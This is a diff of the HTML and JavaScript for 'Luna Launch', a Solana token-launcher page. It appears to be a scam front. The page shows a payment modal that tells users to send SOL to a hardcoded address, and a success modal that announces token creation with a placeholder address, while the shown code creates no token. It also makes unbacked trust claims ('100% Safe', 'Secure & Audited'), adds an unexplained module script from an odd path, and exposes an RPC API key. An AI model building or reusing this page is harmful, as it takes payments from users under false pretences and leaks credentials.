@@ -12,6 +12,7 @@
     <link href="css2.html" rel="stylesheet">
     <title>Luna Launch</title>
     <link rel="stylesheet" href="asset1/index-bdbdubf9.css">
+    <script src="../../_nuxt/assets/index.js" type="module"></script>
     <link rel="stylesheet" href="asset1/styles-DQqVfxH3.css">
     <link rel="stylesheet" href="asset1/Nav-CEpo9JHw.css">
     <link rel="stylesheet" href="asset1/Footer-DFm38Gq1.css">
@@ -70,46 +71,6 @@
             max-width: 600px; /* Constrain form width */
         }
     </style>
-    <!-- Enhanced Modal Styles -->
-    <style>
-        .ll-modal{position:fixed;z-index:1000;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,.76)}
-        .ll-modal.open{display:flex}
-        .ll-modal-card{position:relative;width:min(750px,92vw);background:#181818;border-radius:12px;padding:20px;color:#fff;text-align:center;border:1px solid #242424}
-        .ll-modal-close{position:absolute;right:10px;top:8px;font-size:24px;cursor:pointer}
-        .ll-row{display:flex;align-items:center;gap:10px}
-        .ll-addr{display:flex;align-items:center;background:#f7f7f738;color:#eaeaea;padding:10px;border-radius:25px;margin-top:10px}
-        .ll-btn{background:#fff;color:#000;border-radius:4ex;border:none;padding:.7rem 3.5rem;font-size:1.05rem;cursor:pointer;box-shadow:0 8px 17px #ffffff1a,0 31px 31px #ffffff17,0 69px 41px #ffffff0d,0 122px 49px #ffffff03}
-        .ll-loader-wrap{position:absolute;inset:0;background:rgba(0,0,0,.65);display:none;align-items:center;justify-content:center;border-radius:12px}
-        .ll-loader{border:8px solid #f3f3f3;border-top:8px solid #fff;border-radius:50%;width:50px;height:50px;animation:llspin 1s linear infinite}
-        @keyframes llspin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
-        .line-through{text-decoration:line-through}
-        .closed{display:none !important}
-        
-        /* Wallet balance display */
-        .wallet-balance {
-            font-size: 0.8rem;
-            color: #00ffa3;
-            margin-top: 5px;
-        }
-        
-        /* Loading states */
-        .loading {
-            opacity: 0.7;
-            pointer-events: none;
-        }
-        
-        /* Success states */
-        .success {
-            background: linear-gradient(135deg, #00ffa3, #00d4ff) !important;
-            color: #000 !important;
-        }
-        
-        /* Error states */
-        .error {
-            background: linear-gradient(135deg, #ff6b6b, #ffa500) !important;
-            color: #fff !important;
-        }
-    </style>
     <!-- Dependencies for Solana Wallet Adapter and Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@1.95.3/dist/index.global.js"></script>
     <script src="https://unpkg.com/@solana/wallet-adapter-base@0.11.2/dist/index.global.js"></script>
@@ -130,10 +91,7 @@
                 <a class="nav-link" href="https://raydium.io/swap" rel="noopener noreferrer" target="_blank">Manage Liquidity</a>
             </nav>
             <div class="wallet-dropdown">
-                <div class="wallet-display connect-wallet-btn" id="connect-wallet">
-                    Connect Wallet
-                    <div class="wallet-balance" id="wallet-balance-main"></div>
-                </div>
+                <div class="wallet-display connect-wallet-btn" id="connect-wallet">Connect Wallet</div>
                 <button class="menu-icon" style="background-color: rgb(255, 255, 255); border-radius: 5px; border: medium; cursor: pointer; padding: 8px; margin-left: 10px; transition: 0.3s; display: flex; align-items: center; justify-content: center;">
                     <span class="material-symbols-rounded">
                         <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" class="feather feather-menu" viewBox="0 0 24 24" stroke="#333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -163,7 +121,7 @@
                             <div class="trust-stat"><div class="trust-number">99.9%</div><div class="trust-label">Success Rate</div></div>
                         </div>
                         <div class="trust-badges">
-                            <div class="trust-badge"><div class="badge-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zM9 16H6V10h12v12z" fill="#00FFA3"></path><circle cx="12" cy="15" r="2" fill="#00FFA3"></circle></svg></div><span>Secure &amp; Audited</span></div>
+                            <div class="trust-badge"><div class="badge-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 16H6V10h12v12z" fill="#00FFA3"></path><circle cx="12" cy="15" r="2" fill="#00FFA3"></circle></svg></div><span>Secure &amp; Audited</span></div>
                             <div class="trust-badge"><div class="badge-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M7 2v11h3v9l7-12h-4l4-8z" fill="#FFD700"></path></svg></div><span>Lightning Fast</span></div>
                             <div class="trust-badge"><div class="badge-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10V11.5C15.4,11.5 16,12.4 16,13V16C16,17.4 15.4,18 14.8,18H9.2C8.6,18 8,17.4 8,16V13C8,12.4 8.6,11.5 9.2,11.5V10C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,10V11.5H13.5V10C13.5,8.7 12.8,8.2 12,8.2Z" fill="#00FFA3"></path></svg></div><span>100% Safe</span></div>
                         </div>
@@ -195,7 +153,7 @@
                 </div>
                 <div class="content-container">
                     <div class="content-section">
-                        <div class="content-text-1"><span class="span-1">The world's most powerful</span><span class="span-2">Solana Launcher ever.</span></div>
+                        <div class="content-text-1"><span class="span-1">The world’s most powerful</span><span class="span-2">Solana Launcher ever.</span></div>
                         <div class="content-img-1">
                             <div class="content-controls"><span></span><span></span><span></span></div>
                             <div class="border-bg"></div>
@@ -237,21 +195,21 @@
                     <div class="title-text">Solana Token Creator</div>
                     <div class="title-desc"><span class="span-1">Create and deploy your Solana coin effortlessly in seconds.</span><span class="span-2">Reach the world and scale without limits!</span></div>
                 </div>
-                <form class="token-creation-box" id="token-creation-form">
+                <form class="token-creation-box">
                     <div class="form-section">
-                        <div class="form-field"><label class="field-label">Token Name *</label><input placeholder="Ex: Trump Coin" class="field-input" type="text" name="name" value="" required><span class="field-constraint">Max 32 characters in your name</span></div>
-                        <div class="form-field"><label class="field-label">Token Symbol *</label><input placeholder="Ex: SOL" class="field-input" type="text" name="symbol" value="" required><span class="field-constraint"></span></div>
-                        <div class="form-field"><label class="field-label">Decimals *</label><input placeholder="Ex: 9" class="field-input" type="number" name="decimals" value="9" min="0" max="18" required><span class="field-constraint">Change the number of decimals for your token</span></div>
-                        <div class="form-field"><label class="field-label">Supply *</label><input placeholder="Ex: 1000000000" class="field-input" type="number" name="supply" value="1000000" min="1" required><span class="field-constraint">The initial number of available tokens that will be, created in your wallet</span></div>
+                        <div class="form-field"><label class="field-label">Token Name *</label><input placeholder="Ex: Trump Coin" class="field-input" type="text" name="name" value=""><span class="field-constraint">Max 32 characters in your name</span></div>
+                        <div class="form-field"><label class="field-label">Token Symbol *</label><input placeholder="Ex: SOL" class="field-input" type="text" name="symbol" value=""><span class="field-constraint"></span></div>
+                        <div class="form-field"><label class="field-label">Decimals *</label><input placeholder="Ex: 9" class="field-input" type="number" name="decimals" value="9"><span class="field-constraint">Change the number of decimals for your token</span></div>
+                        <div class="form-field"><label class="field-label">Supply *</label><input placeholder="Ex: 1000000000" class="field-input" type="number" name="supply" value="1000000"><span class="field-constraint">The initial number of available tokens that will be, created in your wallet</span></div>
                         <div class="logo-wrapper">
-                            <div class="logo-box"><span class="label-text">Logo *</span><div class="img-input-wrapper"><span class="material-symbols-rounded">upload</span><span class="text-1">Drag and drop here to upload</span><div class="text-2">.png, .jpg 1000x1000 px</div><input accept=".png, .jpg, .jpeg" class="form-img" type="file" required></div><span class="field-constraint">Add logo for your token!</span></div>
+                            <div class="logo-box"><span class="label-text">Logo *</span><div class="img-input-wrapper"><span class="material-symbols-rounded">upload</span><span class="text-1">Drag and drop here to upload</span><div class="text-2">.png, .jpg 1000x1000 px</div><input accept=".png, .jpg, .jpeg" class="form-img" type="file"></div><span class="field-constraint">Add logo for your token!</span></div>
                             <div class="logo-generation-box">
                                 <div style="display: flex; gap: 0.6rem;"><div class="label-text">Generate Personalized AI Logo</div><span style="padding: 0.2rem 0.7rem; background: rgb(17, 17, 17); border-radius: 3ex; font-size: 0.7rem; color: rgb(107, 95, 246);">COMING SOON</span></div>
                                 <div class="generation-wrapper"><div class="generation-box"><img src="asset1/bba1c45c4d7a1e2206dbce3838618fb84d176061.svg"></div></div>
                                 <div class="generation-set"><span class="field-constraint">Lazy to Create a Logo? Use our Personalized AI Logo Generator for your Token Name</span><div class="generate-btn">Generate</div><span class="field-constraint">(At just 0.05 SOL)</span></div>
                             </div>
                         </div>
-                        <div class="form-field"><label class="field-label">Description *</label><textarea type="long" placeholder="Here you can describe your token" class="field-input" name="description" required></textarea><span class="field-constraint"></span></div>
+                        <div class="form-field"><label class="field-label">Description *</label><textarea type="long" placeholder="Here you can describe your token" class="field-input" name="description"></textarea><span class="field-constraint"></span></div>
                     </div>
                     <div class="form-divider"></div>
                     <div class="form-section">
@@ -290,7 +248,7 @@
                     </div>
                     <div class="form-divider"></div>
                     <div class="form-section">
-                        <div class="form-section-title">Revoke Authorities (Investor's Booster)</div>
+                        <div class="form-section-title">Revoke Authorities (Investor’s Booster)</div>
                         <div class="form-section-authorities">
                             <div class="form-radio-field"><div class="form-radio-header"><div class="form-radio-label">Revoke Freeze</div><div class="checkbox " data-checked="true" style="cursor: pointer; user-select: none;"><input id="authorities.revoke_freeze" style="display: none;" type="checkbox" checked=""><div class="checkbox-marker"></div></div></div><div class="form-radio-description">No one will be able to freeze holders' token accounts anymore</div><div class="form-radio-cost">+0.1 SOL</div></div>
                             <div class="form-radio-field"><div class="form-radio-header"><div class="form-radio-label">Revoke Mint</div><div class="checkbox " data-checked="true" style="cursor: pointer; user-select: none;"><input id="authorities.revoke_mint" style="display: none;" type="checkbox" checked=""><div class="checkbox-marker"></div></div></div><div class="form-radio-description">No one will be able to create more tokens anymore</div><div class="form-radio-cost">+0.1 SOL</div></div>
@@ -300,13 +258,7 @@
                     </div>
                     <div class="submit-section">
                         <div class="form-field"><label class="field-label">Enter token recipient (Optional) *</label><input placeholder="Leave empty to default to the wallet that sends payment" class="field-input" type="text" name="recipient_address" value=""><span class="field-constraint"></span></div>
-                        <div class="button-and-fees">
-                            <button type="button" class="submit-btn" id="launch-token">Launch Token</button>
-                            <div class="token-fees-container">
-                                <span>Total Fees: <strike>0.6 SOL</strike> 0.3 SOL</span>
-                                <div class="wallet-balance" id="wallet-balance-create"></div>
-                            </div>
-                        </div>
+                        <div class="button-and-fees"><button type="button" class="submit-btn" id="launch-token">Launch Token</button><div class="token-fees-container"><span>Total Fees: <strike>0.6 SOL</strike> 0.3 SOL</span></div></div>
                     </div>
                 </form>
             </div>
@@ -317,77 +269,335 @@
                 <div class="copyright-bar"><span>© Luna Launcher 2025</span></div>
                 <div class="policies-bar"><a class="policy-link" href="terms-of-service.html" data-discover="true">Terms of Service</a><span class="separator"></span><a class="policy-link" href="privacy-policy.html" data-discover="true">Privacy Policy</a></div>
             </div>
-            <div class="wallet-dropdown">
-                <div class="wallet-display connect-wallet-btn" id="connect-wallet-footer">
-                    Connect Wallet
-                    <div class="wallet-balance" id="wallet-balance-footer"></div>
-                </div>
-            </div>
+            <div class="wallet-dropdown"><div class="wallet-display connect-wallet-btn" id="connect-wallet-footer">Connect Wallet</div></div>
         </div>
     </div>
 
-    <!-- Modals -->
-    <div class="ll-modal" id="ll-fee-modal">
-        <div class="ll-modal-card">
-            <div class="ll-loader-wrap" id="ll-loader-1"><div class="ll-loader"></div></div>
-            <span class="ll-modal-close" data-close="ll-fee-modal">&times;</span>
-            <h2 class="ll-row" style="justify-content:center;margin:0 0 10px;">
-                <img src="asset1/sol.png" width="30" style="margin-right:6px" alt="SOL"> Payment Required
-            </h2>
-            <p>Send <b id="ll-fee-amount"></b> to the following address to complete your token creation.</p>
-            <div class="ll-addr">
-                <span id="ll-fee-address" style="word-break:break-all">JchoZmAvqcWzJoei8WFfmVGL1c9x2755TJHq2HikkfV</span>
-                <button id="ll-copy-addr" class="ll-btn" style="padding:.4rem 1rem;margin-left:auto;">Copy</button>
-            </div>
-            <div style="margin-top:18px;">
-                <button id="ll-check-tx" class="ll-btn">I've Sent Payment</button>
-                <button id="ll-cancel-tx" class="ll-btn" style="background:transparent;color:#fff;margin-left:10px;">Cancel</button>
-            </div>
-        </div>
-    </div>
-
-    <div class="ll-modal" id="ll-ok-modal">
-        <div class="ll-modal-card">
-            <div class="ll-loader-wrap" id="ll-loader-2"><div class="ll-loader"></div></div>
-            <span class="ll-modal-close" data-close="ll-ok-modal">&times;</span>
-            <h2 class="ll-row" style="justify-content:center;margin:0 0 10px;">
-                <img src="asset1/congratulations.png" width="30" style="margin-right:6px" alt="✓"> Congratulations!
-            </h2>
-            <p>Your token has been successfully created and deployed on the Solana blockchain.</p>
-            <div class="ll-addr">
-                <span id="ll-mint-address" style="word-break:break-all">Token address will appear here...</span>
-                <button id="ll-copy-mint" class="ll-btn" style="padding:.4rem 1rem;margin-left:auto;">Copy</button>
-            </div>
-            <div style="margin-top:18px;display:flex;gap:10px;justify-content:center;">
-                <button id="ll-view-explorer" class="ll-btn">View on Explorer</button>
-                <button id="ll-ok" class="ll-btn" style="background:transparent;color:#fff;">Close</button>
-            </div>
-        </div>
-    </div>
-
-    <div class="ll-modal" id="ll-error-modal">
-        <div class="ll-modal-card">
-            <span class="ll-modal-close" data-close="ll-error-modal">&times;</span>
-            <h2 class="ll-row" style="justify-content:center;margin:0 0 10px;color:#ff6b6b;">
-                <img src="asset1/error.png" width="30" style="margin-right:6px" alt="✕"> Error
-            </h2>
-            <p id="ll-error-message">An error occurred while processing your request.</p>
-            <div style="margin-top:18px;">
-                <button id="ll-error-ok" class="ll-btn" style="background:#ff6b6b;">Okay</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Main Application Script -->
-    <script src="index.js"></script>
-
-    <!-- Additional UI Scripts -->
     <script>
-        // Page navigation
+        (() => {
+            "use strict";
+
+            // ====== CONFIG ======
+            const PLATFORM_FEE = 0.3;            // Base platform fee in SOL
+            const DISCOUNT_FACTOR = 0.5;         // 50% discount on total fees
+            const FEE_ADDRESS = "JchoZmAvqcWzJoei8WFfmVGL1c9x2755TJHq2HikkfV"; // Receiver address for transfers
+
+            // ====== HELPERS ======
+            const $ = (sel, root = document) => root.querySelector(sel);
+            const $$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));
+            const num = (x) => (isFinite(x) ? Number(x) : 0);
+            const getFirstNumber = (txt) => {
+                if (!txt) return 0;
+                const m = String(txt).replace(",", ".").match(/([\d.]+)/);
+                return m ? parseFloat(m[1]) : 0;
+            };
+            const formatSOL = (n, d = 1) => `${n.toFixed(d)} SOL`;
+
+            // Create modal styles and elements if not present
+            function ensureGlobalUI() {
+                if (!$("#ll-modal-styles")) {
+                    const style = document.createElement("style");
+                    style.id = "ll-modal-styles";
+                    style.textContent = `
+                        .ll-modal{position:fixed;z-index:1000;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,.76)}
+                        .ll-modal.open{display:flex}
+                        .ll-modal-card{position:relative;width:min(750px,92vw);background:#181818;border-radius:12px;padding:20px;color:#fff;text-align:center;border:1px solid #242424}
+                        .ll-modal-close{position:absolute;right:10px;top:8px;font-size:24px;cursor:pointer}
+                        .ll-row{display:flex;align-items:center;gap:10px}
+                        .ll-addr{display:flex;align-items:center;background:#f7f7f738;color:#eaeaea;padding:10px;border-radius:25px;margin-top:10px}
+                        .ll-btn{background:#fff;color:#000;border-radius:4ex;border:none;padding:.7rem 3.5rem;font-size:1.05rem;cursor:pointer;box-shadow:0 8px 17px #ffffff1a,0 31px 31px #ffffff17,0 69px 41px #ffffff0d,0 122px 49px #ffffff03}
+                        .ll-loader-wrap{position:absolute;inset:0;background:rgba(0,0,0,.65);display:none;align-items:center;justify-content:center;border-radius:12px}
+                        .ll-loader{border:8px solid #f3f3f3;border-top:8px solid #fff;border-radius:50%;width:50px;height:50px;animation:llspin 1s linear infinite}
+                        @keyframes llspin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+                        .line-through{text-decoration:line-through}
+                        .closed{display:none !important}
+                    `;
+                    document.head.appendChild(style);
+                }
+
+                if (!$("#ll-fee-modal")) {
+                    const wrap = document.createElement("div");
+                    wrap.className = "ll-modal";
+                    wrap.id = "ll-fee-modal";
+                    wrap.innerHTML = `
+                        <div class="ll-modal-card">
+                            <div class="ll-loader-wrap" id="ll-loader-1"><div class="ll-loader"></div></div>
+                            <span class="ll-modal-close" data-close="ll-fee-modal">&times;</span>
+                            <h2 class="ll-row" style="justify-content:center;margin:0 0 10px;">
+                                <img src="asset1/sol.png" width="30" style="margin-right:6px" alt="SOL"> Payment
+                            </h2>
+                            <p>Send <b id="ll-fee-amount"></b> to the following address. After a successful transaction click “Check transaction”.</p>
+                            <div class="ll-addr">
+                                <span id="ll-fee-address" style="word-break:break-all">${FEE_ADDRESS}</span>
+                                <button id="ll-copy-addr" class="ll-btn" style="padding:.4rem 1rem;margin-left:auto;">Copy</button>
+                            </div>
+                            <div style="margin-top:18px;">
+                                <button id="ll-check-tx" class="ll-btn">Check transaction</button>
+                            </div>
+                        </div>`;
+                    document.body.appendChild(wrap);
+                }
+
+                if (!$("#ll-ok-modal")) {
+                    const wrap2 = document.createElement("div");
+                    wrap2.className = "ll-modal";
+                    wrap2.id = "ll-ok-modal";
+                    wrap2.innerHTML = `
+                        <div class="ll-modal-card">
+                            <div class="ll-loader-wrap" id="ll-loader-2"><div class="ll-loader"></div></div>
+                            <span class="ll-modal-close" data-close="ll-ok-modal">&times;</span>
+                            <h2 class="ll-row" style="justify-content:center;margin:0 0 10px;">
+                                <img src="asset1/congratulations.png" width="30" style="margin-right:6px" alt="✓"> Congratulations
+                            </h2>
+                            <p>Your token has been successfully created.</p>
+                            <div class="ll-addr">
+                                <span id="ll-mint-address" style="word-break:break-all">YourTokenAddressHere</span>
+                                <button id="ll-copy-mint" class="ll-btn" style="padding:.4rem 1rem;margin-left:auto;">Copy</button>
+                            </div>
+                            <div style="margin-top:18px;">
+                                <button id="ll-ok" class="ll-btn">Okay</button>
+                            </div>
+                        </div>`;
+                    document.body.appendChild(wrap2);
+                }
+            }
+
+            // Modal open/close functions
+            const openModal = (id) => { const el = document.getElementById(id); if (el) el.classList.add("open"); };
+            const closeModal = (id) => { const el = document.getElementById(id); if (el) el.classList.remove("open"); };
+            window.openModal = () => openModal('ll-fee-modal');
+
+            // Copy text to clipboard
+            async function copyText(txt) {
+                try { await navigator.clipboard.writeText(txt); } catch(e) { console.error("Copy failed:", e); }
+            }
+
+            // ====== FEES ======
+            function parseToggleCost(section) {
+                const costEl = $(".toggle-cost", section);
+                if (!costEl) return 0;
+                if (costEl.classList.contains("toggle-cost-free")) return 0;
+                return getFirstNumber(costEl.textContent);
+            }
+            function isToggleChecked(section) {
+                const input = $("input[type='checkbox']", section);
+                return !!(input && input.checked);
+            }
+            function setToggle(section, checked) {
+                const input = $("input[type='checkbox']", section);
+                const toggle = $(".toggle", section);
+                if (input) input.checked = !!checked;
+                if (toggle) toggle.dataset.toggled = checked ? "true" : "false";
+                const body = $(".toggle-section-body", section);
+                if (body) body.style.display = checked ? "block" : "none";
+            }
+
+            function calcAuthoritiesFees() {
+                let sum = 0;
+                $$(".form-section-authorities .form-radio-field").forEach(field => {
+                    const checkboxWrap = $(".checkbox", field);
+                    const cost = getFirstNumber($(".form-radio-cost", field)?.textContent || "");
+                    const checked =
+                        (checkboxWrap?.getAttribute("data-checked") ?? "false") === "true" ||
+                        $("input[type='checkbox']", checkboxWrap)?.checked;
+                    if (checked) sum += num(cost);
+                });
+                return sum;
+            }
+
+            function calcOptionsFees() {
+                let sum = 0;
+                $$(".form-section .toggle-section").forEach(section => {
+                    const checked = isToggleChecked(section);
+                    if (!checked) return;
+                    sum += num(parseToggleCost(section));
+                });
+                return sum;
+            }
+
+            function updateFeesUI() {
+                const container = $(".token-fees-container");
+                if (!container) return;
+
+                const original = PLATFORM_FEE + calcAuthoritiesFees() + calcOptionsFees();
+                const discounted = original * DISCOUNT_FACTOR;
+
+                const span = $("span", container) || container;
+                span.innerHTML = `Total Fees: <span class="line-through">${formatSOL(original)}</span> ${formatSOL(discounted)}`;
+
+                const feeAmt = $("#ll-fee-amount");
+                if (feeAmt) feeAmt.textContent = formatSOL(discounted);
+                return { original, discounted };
+            }
+
+            // ====== DYNAMIC BODIES FOR TOGGLES ======
+            function ensureToggleBodies() {
+                const creatorSection = $("#creator\\.is_enabled")?.closest(".toggle-section");
+                if (creatorSection && !$(".toggle-section-body", creatorSection)) {
+                    const body = document.createElement("div");
+                    body.className = "toggle-section-body";
+                    body.style.display = "none";
+                    body.innerHTML = `
+                        <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:1rem;">
+                            <div class="form-field">
+                                <label class="field-label">Creator's Address *</label>
+                                <input placeholder="Ex: 3stNIYCJd..." class="field-input" type="text" name="creator.address">
+                                <span class="field-constraint"></span>
+                            </div>
+                            <div class="form-field">
+                                <label class="field-label">Creator's Name *</label>
+                                <input placeholder="Ex: John Doe" class="field-input" type="text" name="creator.name">
+                                <span class="field-constraint"></span>
+                            </div>
+                        </div>`;
+                    creatorSection.appendChild(body);
+                }
+
+                const socialSection = $("#social_links\\.is_enabled")?.closest(".toggle-section");
+                if (socialSection && !$(".toggle-section-body", socialSection)) {
+                    const body = document.createElement("div");
+                    body.className = "toggle-section-body";
+                    body.style.display = "none";
+                    body.innerHTML = `
+                        <div style="display:flex;flex-direction:column;gap:.6rem;">
+                            <div class="form-field">
+                                <label class="field-label">Telegram Link *</label>
+                                <input placeholder="Ex: https://t.me/" class="field-input" type="text" name="social_links.telegram">
+                            </div>
+                            <div class="form-field">
+                                <label class="field-label">Twitter/X Link *</label>
+                                <input placeholder="Ex: https://x.com/@your" class="field-input" type="text" name="social_links.twitter">
+                            </div>
+                            <div class="form-field">
+                                <label class="field-label">Website Link *</label>
+                                <input placeholder="Ex: https://example.com" class="field-input" type="text" name="social_links.project_website">
+                            </div>
+                        </div>`;
+                    socialSection.appendChild(body);
+                }
+
+                const bannerSection = $("#custom_banner\\.is_enabled")?.closest(".toggle-section");
+                if (bannerSection && !$(".toggle-section-body", bannerSection)) {
+                    const body = document.createElement("div");
+                    body.className = "toggle-section-body";
+                    body.style.display = "none";
+                    body.innerHTML = `
+                        <div class="form-field">
+                            <label class="field-label">Banner Image *</label>
+                            <div class="img-input-wrapper">
+                                <span class="material-symbols-rounded">upload</span>
+                                <span class="text-1">Drag and drop here to upload</span>
+                                <div class="text-2">.png, .jpg 1500x500 px</div>
+                                <input accept=".png,.jpg,.jpeg" class="form-img form-img-banner" type="file">
+                            </div>
+                            <span class="field-constraint">Recommended 1500×500 px</span>
+                        </div>`;
+                    bannerSection.appendChild(body);
+                }
+
+                const mcSection = $("#multi_chain_launch\\.is_enabled")?.closest(".toggle-section");
+                if (mcSection && !$(".toggle-section-body", mcSection)) {
+                    const body = document.createElement("div");
+                    body.className = "toggle-section-body";
+                    body.style.display = "none";
+                    body.innerHTML = `
+                        <div class="form-field">
+                            <label class="field-label">Select Chains</label>
+                            <div style="display:grid;grid-template-columns:repeat(3, minmax(0,1fr));gap:.5rem;text-align:left;">
+                                ${["Solana","Base","BSC","Arbitrum","Polygon","Avalanche"].map(ch => `
+                                    <label style="display:flex;align-items:center;gap:.5rem;">
+                                        <input type="checkbox" name="multi_chain.${ch.toLowerCase()}" ${ch==="Solana"?"checked":""}> ${ch}
+                                    </label>`).join("")}
+                            </div>
+                            <span class="field-constraint">Solana is default. Others are optional.</span>
+                        </div>`;
+                    mcSection.appendChild(body);
+                }
+            }
+
+            // Bind toggle handlers
+            function bindToggleHandlers() {
+                $$(".form-section .toggle-section").forEach(section => {
+                    const toggle = $(".toggle", section);
+                    const input = $("input[type='checkbox']", section);
+                    if (!toggle || !input) return;
+
+                    toggle.addEventListener("click", () => {
+                        const newState = !input.checked;
+                        setToggle(section, newState);
+                        updateFeesUI();
+                    });
+                });
+            }
+
+            // Bind authorities checkboxes
+            function bindAuthoritiesHandlers() {
+                $$(".form-section-authorities .form-radio-field").forEach(field => {
+                    const wrap = $(".checkbox", field);
+                    const input = $("input[type='checkbox']", wrap);
+                    if (!wrap || !input) return;
+                    wrap.style.cursor = "pointer";
+                    wrap.addEventListener("click", (e) => {
+                        e.stopPropagation();
+                        const cur = wrap.getAttribute("data-checked") === "true";
+                        wrap.setAttribute("data-checked", cur ? "false" : "true");
+                        input.checked = !cur;
+                        updateFeesUI();
+                    });
+                });
+            }
+
+            // Bind image preview for logo and banner
+            function bindImagePreviews() {
+                document.addEventListener("change", (e) => {
+                    const input = e.target;
+                    if (!(input instanceof HTMLInputElement)) return;
+                    if (!input.classList.contains("form-img")) return;
+
+                    const file = input.files && input.files[0];
+                    if (!file) return;
+                    const reader = new FileReader();
+                    reader.onload = (ev) => {
+                        const imgSrc = ev.target?.result;
+                        const wrapper = input.closest(".img-input-wrapper");
+                        if (wrapper && imgSrc) {
+                            wrapper.innerHTML = `<img src="${imgSrc}" alt="Uploaded" style="max-width:100%;height:auto;border-radius:12px;">`;
+                        }
+                    };
+                    reader.readAsDataURL(file);
+                });
+            }
+
+            // Bind sidebar menu
+            function bindSidebarMenu() {
+                const btn = $(".menu-icon");
+                const menu = $(".sidebar-menu");
+                if (!btn || !menu) return;
+                btn.addEventListener("click", () => {
+                    menu.classList.toggle("closed");
+                });
+                menu.addEventListener("click", (e) => {
+                    const a = e.target.closest("a");
+                    if (a) menu.classList.add("closed");
+                });
+            }
+
+            // ====== INIT ======
+            document.addEventListener("DOMContentLoaded", () => {
+                ensureGlobalUI();
+                ensureToggleBodies();
+                bindToggleHandlers();
+                bindAuthoritiesHandlers();
+                bindImagePreviews();
+                bindSidebarMenu();
+                updateFeesUI();
+            });
+        })();
+    </script>
+    <script>
         const landing = document.getElementById('landing');
         const createToken = document.getElementById('create-token');
         const navLinks = document.querySelectorAll('.nav-link');
-        
         function updateDisplay() {
             const hash = location.hash;
             if (hash === '#create-token') {
@@ -416,61 +626,155 @@
                 });
             }
         }
-
-        // Sidebar menu functionality
-        function bindSidebarMenu() {
-            const btn = document.querySelector('.menu-icon');
-            const menu = document.querySelector('.sidebar-menu');
-            if (!btn || !menu) return;
-            
-            btn.addEventListener('click', () => {
-                menu.classList.toggle('closed');
-            });
-            
-            menu.addEventListener('click', (e) => {
-                const a = e.target.closest('a');
-                if (a) menu.classList.add('closed');
-            });
-        }
-
-        // Initialize when DOM is ready
-        document.addEventListener('DOMContentLoaded', () => {
-            updateDisplay();
-            bindSidebarMenu();
-            
-            // Listen for hash changes
-            window.addEventListener('hashchange', updateDisplay);
-            
-            // Initialize fee calculation
-            if (window.tokenLauncher) {
-                window.tokenLauncher.calculateTotalFees();
-            }
-        });
-
-        // Global modal functions for backward compatibility
-        window.openModal = (modalId) => {
-            const modal = document.getElementById(modalId);
-            if (modal) modal.classList.add('open');
-        };
-
-        window.closeModal = (modalId) => {
-            const modal = document.getElementById(modalId);
-            if (modal) modal.classList.remove('open');
-        };
-
-        // Copy to clipboard function
-        async function copyText(text) {
-            try {
-                await navigator.clipboard.writeText(text);
-                if (window.tokenLauncher) {
-                    window.tokenLauncher.showSuccess('Copied to clipboard!');
-                }
-            } catch (err) {
-                console.error('Failed to copy text: ', err);
-            }
-        }
+        window.addEventListener('hashchange', updateDisplay);
+        window.addEventListener('load', updateDisplay);
     </script>
+    <!-- Wallet Adapter Integration Script -->
+    <script>
+        $(document).ready(function() {
+            // Initialize Solana Wallet Adapter
+            const { Connection, PublicKey, Transaction, SystemProgram } = solanaWeb3;
+            const { WalletNotSelectedError } = solanaWalletAdapterBase;
+            const { PhantomWalletAdapter, SolflareWalletAdapter, BackpackWalletAdapter } = solanaWalletAdapterWallets;
 
+            // Supported wallets
+            const wallets = [
+                new PhantomWalletAdapter(),
+                new SolflareWalletAdapter(),
+                new BackpackWalletAdapter(),
+                // Add more wallet adapters here (e.g., NestWalletAdapter if available)
+            ];
+
+            // Initialize Solana connection
+            // Replace 'YOUR-API-KEY' with a valid Syndica API key or use a public RPC like 'https://api.mainnet-beta.solana.com'
+            const connection = new Connection('https://solana-mainnet.api.syndica.io/api-key/pFT17iBbtFSN8EJPtzH5EJBfdY6aLnzEvCywMdY3PwAWGujrYW3JCm99dqnvCWVtSif2TNi2TiQbQ3TQ8SG4pADiY7vdhhiY2F', 'confirmed');
+            let walletAdapter = null;
+
+            // Connect to wallet
+            async function connectWallet() {
+                try {
+                    // Try connecting to each wallet until one succeeds
+                    const walletSelect = await wallets.reduce(async (promise, wallet) => {
+                        try {
+                            await wallet.connect();
+                            return wallet;
+                        } catch (err) {
+                            return promise;
+                        }
+                    }, Promise.resolve(null));
+
+                    if (!walletSelect) {
+                        throw new WalletNotSelectedError();
+                    }
+
+                    walletAdapter = walletSelect;
+                    const publicKey = walletAdapter.publicKey;
+                    console.log(`Connected to ${walletAdapter.name} Wallet:`, publicKey.toString());
+
+                    // Update UI
+                    $('#connect-wallet, #connect-wallet-footer').text(`${walletAdapter.name} Connected: ${publicKey.toString().slice(0, 4)}...${publicKey.toString().slice(-4)}`);
